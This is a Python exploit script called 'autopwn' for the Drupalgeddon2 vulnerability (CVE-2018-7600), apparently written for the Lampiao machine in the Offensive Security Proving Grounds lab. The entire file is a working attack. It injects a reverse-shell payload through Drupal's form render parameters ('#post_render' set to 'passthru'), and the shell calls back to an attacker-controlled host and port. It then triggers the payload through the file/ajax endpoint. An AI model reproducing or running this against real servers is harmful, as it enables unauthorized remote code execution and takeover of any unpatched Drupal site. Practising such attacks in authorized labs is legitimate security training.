#!/usr/bin/python3

import requests
import re
import pyfiglet
from colorama import Fore, Back, Style

# change this
rhost = "192.168.49.158"
rport = 9999
url = "http://192.168.158.48:1898"

def banner(text="autopwn"):
    print(Fore.YELLOW + pyfiglet.figlet_format(text, font="banner"))
    print(Fore.GREEN + "[+] Author: @dugisan3rd")
    print("[+] Medium: Offensive Security Proving Ground")
    print("[+] Link: https://portal.offensive-security.com/proving-grounds/play")
    print("[+] Machine: Lampiao")
    print("[+] Vulnerability: CVE-2018-7600 (Drupalgeddon2)\n" + Style.RESET_ALL)


if __name__ == "__main__":
    banner()
    payload = "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{0}\",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'".format(rhost, rport)
    # payload = "id"
    parameter = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':payload, 'name[#type]':'markup'}
    data = {'form_id':'user_pass', '_triggering_element_name':'name'}

    r = requests.post(url, params=parameter, data=data)
    form = re.search('<input type="hidden" name="form_build_id" value="(.*?)" \/>', r.text)
    if form:
        form_build = form.group(1)
        parameter = {'q': 'file/ajax/name/#value/' + form_build}
        data = {'form_build_id': form_build}
        r = requests.post(url, params=parameter, data=data)
        output = r.text.split("[{")
        print(Fore.RED + "[+] Output: {0}".format(output[0]))
    else:
        print("[+] Error!")